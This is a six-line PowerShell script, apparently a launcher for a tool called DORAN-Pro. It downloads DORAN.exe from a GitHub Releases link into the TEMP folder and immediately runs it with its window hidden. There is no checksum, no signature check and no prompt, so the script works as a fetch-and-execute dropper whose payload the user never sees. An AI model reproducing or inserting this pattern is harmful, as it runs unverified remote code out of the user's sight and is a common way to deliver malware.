# Download and run the compiled DORAN.exe from GitHub Releases
$exeUrl = "https://github.com/learnaisimplified/DORAN-Pro/releases/download/v1.2.3/DORAN.exe"
$tempExe = "$env:TEMP\DORAN.exe"

Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe -UseBasicParsing
Start-Process -FilePath $tempExe -WindowStyle Hidden
